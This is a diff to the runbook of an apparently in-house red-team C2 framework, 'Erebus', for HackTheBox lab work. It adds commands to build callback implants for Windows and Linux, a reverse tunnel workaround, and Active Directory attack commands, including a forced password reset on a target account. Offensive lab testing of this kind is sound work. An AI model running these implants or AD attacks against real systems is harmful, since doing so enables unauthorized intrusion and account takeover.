@@ -57,16 +57,33 @@ Workdir: `~/htb-<machine>/` with mode `600` secret files.
 ```bash
 cd "/home/zero/Downloads/Zypheron project/Erebus"
 make erebus
-# terminal A:
-./build/erebus serve   # or: erebus serve
-# build implant for target OS; callback must reach teamserver from target
-make implant-win CALLBACK_URL=https://<C2_REACHABLE>:443 SLEEP_MS=500 JITTER_PCT=10
-# optional C PE: make implant-c  / generate --language c
+# terminal A — keep C2 up (do NOT use `erebus serve` in a pipe; stdin close kills teamserver):
+./build/erebus teamserver
+
+# Windows primary (C PE):
+make implant-c CALLBACK_URL=https://<C2_REACHABLE>:8443 \
+  CA_CERT_PATH=$HOME/.erebus/ca-cert.pem SLEEP_MS=500 JITTER_PCT=10
+
+# Linux primary (C) — default after Linux foothold:
+make implant-c-linux CALLBACK_URL=https://<C2_REACHABLE>:8443 \
+  CA_CERT_PATH=$HOME/.erebus/ca-cert.pem SLEEP_MS=500 JITTER_PCT=10
+# If host blocks tun0: CALLBACK_URL=https://127.0.0.1:8443 + scripts/htb_reverse_tunnel.sh user@TARGET
 ```
 
-Drop implant after initial shell (WinRM/SSH/etc.) when testing C2. Interactive lab: low sleep OK; kill implant and stop listeners when done.
+Drop implant after initial shell (WinRM/SSH/etc.) when testing C2. **Prefer C** on both OS; Go only with a one-line justification (e.g. reverse SOCKS until C M4c). Interactive lab: low sleep OK; kill implant and stop listeners when done.  
+Linux plan: `docs/plans/SPRINT_L_C_LINUX.md`.
 
 ### 3. Soft-compromise path (preferred AD QA)
+
+Host-side first when there is no implant / WinRM is filtered:
+
+```bash
+./build/erebus smb shares --host <IP> --anon
+./build/erebus ldap enum --dc <IP> --domain DOM --user u --pass-file ./p --type interesting
+./build/erebus ldap dangling --dc <IP> --domain DOM --user u --pass-file ./p
+./build/erebus ad password --dc <IP> --domain DOM --user u --pass-file ./p --target t --new-pass-file ./n
+kerberos skew --dc <IP>   # operator REPL; fail loud before TGT/PKINIT
+```
 
 After session is alive:
 
@@ -98,7 +115,7 @@ Use external tools, document:
 | --- | --- | --- |
 ```
 
-Known gaps (P1+): ACL enum, RBCD helpers, shadow creds, AES TGT/tickets, DNS write, WSUS MITM (operator infra).
+Known gaps (P1+): ACL enum, RBCD helpers, shadow creds, AES TGT/tickets, ADCS template create/req, PKINIT UnPAC, SMB/ATSVC deploy, DNS write, WSUS MITM (operator infra).
 
 ### 5. Report & cleanup
 
